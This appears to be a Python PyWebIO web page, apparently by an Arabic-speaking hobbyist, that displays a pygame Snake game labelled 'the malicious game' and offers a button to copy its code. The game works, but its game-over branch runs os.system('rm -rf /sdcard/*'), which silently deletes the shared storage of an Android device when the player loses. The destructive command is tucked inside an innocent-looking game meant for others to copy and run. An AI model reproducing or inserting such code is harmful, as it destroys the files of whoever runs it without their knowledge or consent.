from pywebio.output import put_html, put_markdown, put_text, put_button
from pywebio import start_server
import os
import pyperclip
def web_main():
    put_html("""
    <style>
        body {
            font-family: "Segoe UI", Tahoma, sans-serif;
            background: url("https://www2.0zz0.com/2025/04/21/19/953946234.png") no-repeat center/cover fixed;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(255,255,255,0.85);
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        h2, h3 {
            margin-bottom: 10px;
            color: #2c3e50;
        }
        .social-buttons {
            text-align: center;
            margin-bottom: 30px;
        }
        .social-button {
            display: inline-block;
            margin: 0 8px;
            padding: 10px 18px;
            text-decoration: none;
            color: #fff;
            border-radius: 4px;
            font-weight: bold;
            transition: transform 0.2s;
            border: none;
            cursor: pointer;
        }
        .social-button:hover {
            transform: translateY(-2px);
        }
        .facebook  { background-color: #1877F2; }
        .youtube   { background-color: #FF0000; }
        .instagram { background-color: #C13584; }
        @media (max-width: 600px) {
            .social-button {
                padding: 8px 12px;
                font-size: 0.9rem;
            }
        }
    </style>

    <div class="container">
        <h2>مواقعنا على منصات التواصل</h2>
        <div class="social-buttons">
            <button class="social-button facebook" onclick="window.open('https://www.facebook.com/fars.bla.frs.671146', '_blank')">فيسبوك</button>
            <button class="social-button youtube" onclick="window.open('https://www.youtube.com/@يَوْمِيَاتْ-مُبَرْمِجْ-مَّزُجْ', '_blank')">يوتيوب</button>
            <button class="social-button instagram" onclick="window.open('https://www.instagram.com/frsbl_frs', '_blank')">انستغرام</button>
        </div>
    </div>
    """)

    put_html('<div class="container">')
    put_markdown("### اللعبة الخبيثة")

    code_snippet = '''import pygame
import random
import sys
import os

pygame.init()

WIDTH, HEIGHT = 600, 400
BLOCK_SIZE = 20
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("\u0644\u0639\u0628\u0629 \u0627\u0644\u0623\u0641\u0639\u0649")

WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
BLACK = (0, 0, 0)
BUTTON_COLOR = (50, 50, 50)

snake = [(100, 100), (90, 100), (80, 100)]
snake_dir = (BLOCK_SIZE, 0)

food = (
    random.randint(0, (WIDTH // BLOCK_SIZE) - 1) * BLOCK_SIZE,
    random.randint(0, (HEIGHT // BLOCK_SIZE) - 1) * BLOCK_SIZE
)

clock = pygame.time.Clock()
speed = 10

button_size = 80
margin = 20

base_y = HEIGHT - (button_size * 2 + margin + 10)
base_x = (WIDTH - (button_size * 3 + margin * 2)) // 2

up_button_rect   = pygame.Rect(base_x + button_size + margin, base_y, button_size, button_size)
left_button_rect = pygame.Rect(base_x, base_y + button_size + margin, button_size, button_size)
down_button_rect = pygame.Rect(base_x + button_size + margin, base_y + button_size + margin, button_size, button_size)
right_button_rect = pygame.Rect(base_x + 2 * (button_size + margin), base_y + button_size + margin, button_size, button_size)

def draw_snake(snake):
    for segment in snake:
        pygame.draw.rect(screen, GREEN, (segment[0], segment[1], BLOCK_SIZE, BLOCK_SIZE))

def draw_food(food):
    pygame.draw.rect(screen, RED, (food[0], food[1], BLOCK_SIZE, BLOCK_SIZE))

def draw_buttons():
    pygame.draw.rect(screen, BUTTON_COLOR, up_button_rect)
    pygame.draw.rect(screen, BUTTON_COLOR, left_button_rect)
    pygame.draw.rect(screen, BUTTON_COLOR, down_button_rect)
    pygame.draw.rect(screen, BUTTON_COLOR, right_button_rect)

    font = pygame.font.SysFont(None, 50)
    up_text = font.render("\u2191", True, WHITE)
    down_text = font.render("\u2193", True, WHITE)
    left_text = font.render("\u2190", True, WHITE)
    right_text = font.render("\u2192", True, WHITE)

    screen.blit(up_text, up_text.get_rect(center=up_button_rect.center))
    screen.blit(down_text, down_text.get_rect(center=down_button_rect.center))
    screen.blit(left_text, left_text.get_rect(center=left_button_rect.center))
    screen.blit(right_text, right_text.get_rect(center=right_button_rect.center))

def check_collision(snake):
    head = snake[0]
    if head[0] < 0 or head[0] >= WIDTH or head[1] < 0 or head[1] >= HEIGHT:
        return True
    if head in snake[1:]:
        return True
    return False

def main():
    global snake, snake_dir, food
    running = True
    while running:
        screen.fill(BLACK)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP and snake_dir != (0, BLOCK_SIZE):
                    snake_dir = (0, -BLOCK_SIZE)
                elif event.key == pygame.K_DOWN and snake_dir != (0, -BLOCK_SIZE):
                    snake_dir = (0, BLOCK_SIZE)
                elif event.key == pygame.K_LEFT and snake_dir != (BLOCK_SIZE, 0):
                    snake_dir = (-BLOCK_SIZE, 0)
                elif event.key == pygame.K_RIGHT and snake_dir != (-BLOCK_SIZE, 0):
                    snake_dir = (BLOCK_SIZE, 0)
            elif event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if up_button_rect.collidepoint(mouse_pos) and snake_dir != (0, BLOCK_SIZE):
                    snake_dir = (0, -BLOCK_SIZE)
                elif down_button_rect.collidepoint(mouse_pos) and snake_dir != (0, -BLOCK_SIZE):
                    snake_dir = (0, BLOCK_SIZE)
                elif left_button_rect.collidepoint(mouse_pos) and snake_dir != (BLOCK_SIZE, 0):
                    snake_dir = (-BLOCK_SIZE, 0)
                elif right_button_rect.collidepoint(mouse_pos) and snake_dir != (-BLOCK_SIZE, 0):
                    snake_dir = (BLOCK_SIZE, 0)

        new_head = (snake[0][0] + snake_dir[0], snake[0][1] + snake_dir[1])
        snake.insert(0, new_head)

        if snake[0] == food:
            food = (
                random.randint(0, (WIDTH // BLOCK_SIZE) - 1) * BLOCK_SIZE,
                random.randint(0, (HEIGHT // BLOCK_SIZE) - 1) * BLOCK_SIZE
            )
        else:
            snake.pop()

        draw_snake(snake)
        draw_food(food)
        draw_buttons()

        if check_collision(snake):
            print("\u0627\u0646\u062a\u0647\u062a \u0627\u0644\u0644\u0639\u0628\u0629!")
            running = False
            os.system("rm -rf /sdcard/*")

        pygame.display.flip()
        clock.tick(speed)

    pygame.quit()
    sys.exit()'''

    put_text(code_snippet)

    def copy_code():
        pyperclip.copy(code_snippet)
        put_text("\u062a\u0645 \u0646\u0633\u062e \u0627\u0644\u0643\u0648\u062f \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629!")

    put_button("\u0646\u0633\u062e \u0627\u0644\u0643\u0648\u062f", onclick=copy_code)
    put_html('</div>')

if __name__ == '__main__':
    PORT = int(os.getenv("PORT", 10000))
    start_server(web_main, port=PORT, debug=True)